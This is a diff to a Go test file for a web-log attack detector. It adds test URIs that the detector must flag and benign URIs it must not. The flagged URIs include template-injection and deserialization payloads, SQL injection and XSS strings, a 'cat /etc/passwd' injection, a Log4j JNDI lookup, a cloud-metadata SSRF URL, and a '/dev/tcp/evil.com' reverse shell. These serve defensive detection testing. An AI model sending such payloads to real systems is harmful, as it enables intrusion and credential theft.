@@ -417,6 +417,83 @@ func TestDetectorSignatures(t *testing.T) {
 			expectType: DetSSTI,
 		},
 		{
+			name: "SSTI - FreeMarker assign",
+			entry: &types.LogEntry{
+				RemoteIP:  "1.2.3.4",
+				URI:       `/page?x=<#assign cmd="exec">`,
+				UserAgent: "Mozilla/5.0",
+				Status:    200,
+			},
+			expectDet:  true,
+			expectType: DetSSTI,
+		},
+		{
+			name: "SSTI - ERB expression",
+			entry: &types.LogEntry{
+				RemoteIP:  "1.2.3.4",
+				URI:       `/page?x=<%=system("id")%>`,
+				UserAgent: "Mozilla/5.0",
+				Status:    200,
+			},
+			expectDet:  true,
+			expectType: DetSSTI,
+		},
+		{
+			name: "SSTI - Thymeleaf expression",
+			entry: &types.LogEntry{
+				RemoteIP:  "1.2.3.4",
+				URI:       `/page?x=__${T(java.lang.Runtime)}__`,
+				UserAgent: "Mozilla/5.0",
+				Status:    200,
+			},
+			expectDet:  true,
+			expectType: DetSSTI,
+		},
+		{
+			name: "RCE - Java deserialization base64",
+			entry: &types.LogEntry{
+				RemoteIP:  "1.2.3.4",
+				URI:       "/page?data=rO0ABXNyABRqYXZhLnV0aWwuU2Nhbm5lcg",
+				UserAgent: "Mozilla/5.0",
+				Status:    200,
+			},
+			expectDet:  true,
+			expectType: DetRCE,
+		},
+		{
+			name: "RCE - Node deserialization gadget",
+			entry: &types.LogEntry{
+				RemoteIP:  "1.2.3.4",
+				URI:       "/api?data=_$$ND_FUNC$$_process_main",
+				UserAgent: "Mozilla/5.0",
+				Status:    200,
+			},
+			expectDet:  true,
+			expectType: DetRCE,
+		},
+		{
+			name: "CRLF - Java ghost bits bypass",
+			entry: &types.LogEntry{
+				RemoteIP:  "1.2.3.4",
+				URI:       "/page?x=%E5%98%8A%E5%98%8DSet-Cookie:evil=1",
+				UserAgent: "Mozilla/5.0",
+				Status:    200,
+			},
+			expectDet:  true,
+			expectType: DetCRLFInjection,
+		},
+		{
+			name: "Open Redirect - backslash bypass",
+			entry: &types.LogEntry{
+				RemoteIP:  "1.2.3.4",
+				URI:       `/r?url=/\evil.com`,
+				UserAgent: "Mozilla/5.0",
+				Status:    200,
+			},
+			expectDet:  true,
+			expectType: DetOpenRedirect,
+		},
+		{
 			name: "GraphQL Introspection - __schema",
 			entry: &types.LogEntry{
 				RemoteIP:  "1.2.3.4",
@@ -639,6 +716,317 @@ func TestDetectorSignatures(t *testing.T) {
 				if det != nil {
 					t.Errorf("expected no detection, got %v", det)
 				}
+			}
+		})
+	}
+}
+
+func TestDetectorFalsePositives(t *testing.T) {
+	detector := NewDetector()
+
+	tests := []struct {
+		name string
+		uri  string
+		ua   string
+	}{
+		{
+			name: "English words 'selecting' and 'from' in path",
+			uri:  "/blog/2019/selecting-tips-from-experts",
+			ua:   "Mozilla/5.0",
+		},
+		{
+			name: "Word 'from' alone in path",
+			uri:  "/api/data-from-server",
+			ua:   "Mozilla/5.0",
+		},
+		{
+			name: "Word 'delete' without FROM in query",
+			uri:  "/products/delete-confirmation",
+			ua:   "Mozilla/5.0",
+		},
+		{
+			name: "Word 'sleep' as part of compound word",
+			uri:  "/help/sleep-tracking",
+			ua:   "Mozilla/5.0",
+		},
+		{
+			name: "Word 'information' without _schema",
+			uri:  "/search?q=information-about-cats",
+			ua:   "Mozilla/5.0",
+		},
+		{
+			name: "Word 'export' in path",
+			uri:  "/api/v1/users/export",
+			ua:   "Mozilla/5.0",
+		},
+		{
+			name: "Legitimate API with query params",
+			uri:  "/api/v1/users?id=42&include=profile",
+			ua:   "Mozilla/5.0",
+		},
+		{
+			name: "Legitimate path with 'type' parameter",
+			uri:  "/search?type=products&q=laptop",
+			ua:   "Mozilla/5.0",
+		},
+		{
+			name: "Legitimate path with 'query' parameter",
+			uri:  "/api/search?query=laptop",
+			ua:   "Mozilla/5.0",
+		},
+		{
+			name: "Legitimate CSS request",
+			uri:  "/static/css/main.css",
+			ua:   "Mozilla/5.0",
+		},
+		{
+			name: "Legitimate JS bundle request",
+			uri:  "/static/js/app.bundle.js",
+			ua:   "Mozilla/5.0",
+		},
+		{
+			name: "Legitimate favicon request",
+			uri:  "/favicon.ico",
+			ua:   "Mozilla/5.0",
+		},
+		{
+			name: "Legitimate health check",
+			uri:  "/health",
+			ua:   "Mozilla/5.0",
+		},
+		{
+			name: "Legitimate pagination params",
+			uri:  "/products?page=2&limit=20&sort=price",
+			ua:   "Mozilla/5.0",
+		},
+		{
+			name: "Legitimate OAuth callback",
+			uri:  "/auth/callback?code=abc123&state=xyz",
+			ua:   "Mozilla/5.0",
+		},
+		{
+			name: "Legitimate internal redirect",
+			uri:  "/login?return=/dashboard",
+			ua:   "Mozilla/5.0",
+		},
+		{
+			name: "Legitimate documentation path",
+			uri:  "/docs/v2/getting-started/installation",
+			ua:   "Mozilla/5.0",
+		},
+		{
+			name: "Legitimate contact form",
+			uri:  "/contact?subject=hello",
+			ua:   "Mozilla/5.0",
+		},
+		{
+			name: "Legitimate download endpoint",
+			uri:  "/download/file.pdf",
+			ua:   "Mozilla/5.0",
+		},
+		{
+			name: "Empty URI",
+			uri:  "/",
+			ua:   "Mozilla/5.0",
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			entry := &types.LogEntry{
+				RemoteIP:  "192.168.1.100",
+				URI:       tt.uri,
+				UserAgent: tt.ua,
+				Status:    200,
+			}
+			det := detector.Detect(entry)
+			if det != nil {
+				t.Errorf("FALSE POSITIVE: URI %q triggered detection %s (%s)", tt.uri, det.Type, det.Desc)
+			}
+		})
+	}
+}
+
+func TestPatternUniqueness(t *testing.T) {
+	seen := make(map[string]string)
+	dupes := 0
+
+	for i, p := range compilePatterns() {
+		key := p.re.String()
+		if prev, ok := seen[key]; ok {
+			t.Errorf("duplicate pattern: %q (desc %q, confidence %d) at index %d duplicates %q at index ?", key, p.desc, p.confidence, i, prev)
+			dupes++
+		}
+		seen[key] = p.desc
+	}
+
+	for i, p := range rawPatterns {
+		key := p.re.String()
+		if prev, ok := seen[key]; ok {
+			t.Errorf("duplicate raw pattern: %q (desc %q, confidence %d) at index %d duplicates %q", key, p.desc, p.confidence, i, prev)
+			dupes++
+		}
+		seen[key] = p.desc
+	}
+
+	if dupes > 0 {
+		t.Errorf("%d duplicate patterns detected", dupes)
+	}
+}
+
+func TestDetectAllPolyglot(t *testing.T) {
+	detector := NewDetector()
+
+	tests := []struct {
+		name         string
+		entry        *types.LogEntry
+		wantTypes    []DetectionType
+		wantMinCount int
+	}{
+		{
+			name: "Polyglot SQLi + XSS payload",
+			entry: &types.LogEntry{
+				RemoteIP: "1.2.3.4",
+				URI:      "/search?q=<script>alert(1)</script>%20UNION%20SELECT%20username,password%20FROM%20users",
+				Status:   200,
+			},
+			wantTypes:    []DetectionType{DetXSS, DetSQLInjection},
+			wantMinCount: 2,
+		},
+		{
+			name: "Polyglot SQLi + RCE (command substitution)",
+			entry: &types.LogEntry{
+				RemoteIP: "1.2.3.4",
+				URI:      "/page?id=1;cat%20/etc/passwd--",
+				Status:   200,
+			},
+			wantTypes:    []DetectionType{DetRCE, DetPathTraversal},
+			wantMinCount: 1,
+		},
+		{
+			name: "Single attack - no duplicate types",
+			entry: &types.LogEntry{
+				RemoteIP: "1.2.3.4",
+				URI:      "/products?id=1%20UNION%20SELECT%20username,password%20FROM%20users",
+				Status:   200,
+			},
+			wantTypes:    []DetectionType{DetSQLInjection},
+			wantMinCount: 1,
+		},
+		{
+			name: "Legitimate - no detections",
+			entry: &types.LogEntry{
+				RemoteIP: "1.2.3.4",
+				URI:      "/menu",
+				Status:   200,
+			},
+			wantTypes:    nil,
+			wantMinCount: 0,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			dets := detector.DetectAll(tt.entry)
+
+			if tt.wantMinCount == 0 {
+				if len(dets) != 0 {
+					t.Fatalf("expected 0 detections, got %d: %+v", len(dets), dets)
+				}
+				return
+			}
+
+			if len(dets) < tt.wantMinCount {
+				t.Fatalf("expected at least %d detections, got %d: %+v", tt.wantMinCount, len(dets), dets)
+			}
+
+			seen := make(map[DetectionType]bool)
+			for _, d := range dets {
+				if seen[d.Type] {
+					t.Errorf("duplicate detection type %s in results", d.Type)
+				}
+				seen[d.Type] = true
+			}
+
+			for _, want := range tt.wantTypes {
+				if !seen[want] {
+					t.Errorf("expected detection type %s not found in results: %+v", want, dets)
+				}
+			}
+		})
+	}
+}
+
+func TestDetectionConfidence(t *testing.T) {
+	detector := NewDetector()
+
+	tests := []struct {
+		name            string
+		uri             string
+		ua              string
+		wantType        DetectionType
+		wantMinConf     int
+		wantMaxConf     int
+	}{
+		{
+			name:        "UNION SELECT — high confidence",
+			uri:         "/?id=1%20UNION%20SELECT%20username,password%20FROM%20users",
+			ua:          "Mozilla/5.0",
+			wantType:    DetSQLInjection,
+			wantMinConf: 9,
+			wantMaxConf: 10,
+		},
+		{
+			name:        "Encoded chars — low confidence",
+			uri:         "/page?x=%3Cdiv%3E",
+			ua:          "Mozilla/5.0",
+			wantType:    DetXSS,
+			wantMinConf: 1,
+			wantMaxConf: 5,
+		},
+		{
+			name:        "JNDI lookup — max confidence",
+			uri:         "/login?x=${jndi:ldap://evil.com/a}",
+			ua:          "Mozilla/5.0",
+			wantType:    DetLog4j,
+			wantMinConf: 9,
+			wantMaxConf: 10,
+		},
+		{
+			name:        "Reverse shell — max confidence",
+			uri:         "/page?cmd=bash+-i+>/dev/tcp/evil.com/443",
+			ua:          "Mozilla/5.0",
+			wantType:    DetRCE,
+			wantMinConf: 9,
+			wantMaxConf: 10,
+		},
+		{
+			name:        "Cloud metadata — max confidence",
+			uri:         "/proxy?url=http://169.254.169.254/latest/meta-data/",
+			ua:          "Mozilla/5.0",
+			wantType:    DetSSRF,
+			wantMinConf: 9,
+			wantMaxConf: 10,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			entry := &types.LogEntry{
+				RemoteIP:  "1.2.3.4",
+				URI:       tt.uri,
+				UserAgent: tt.ua,
+				Status:    200,
+			}
+			det := detector.Detect(entry)
+			if det == nil {
+				t.Fatalf("expected detection, got nil")
+			}
+			if det.Type != tt.wantType {
+				t.Errorf("expected type %s, got %s", tt.wantType, det.Type)
+			}
+			if det.Confidence < tt.wantMinConf || det.Confidence > tt.wantMaxConf {
+				t.Errorf("expected confidence %d-%d, got %d", tt.wantMinConf, tt.wantMaxConf, det.Confidence)
 			}
 		})
 	}
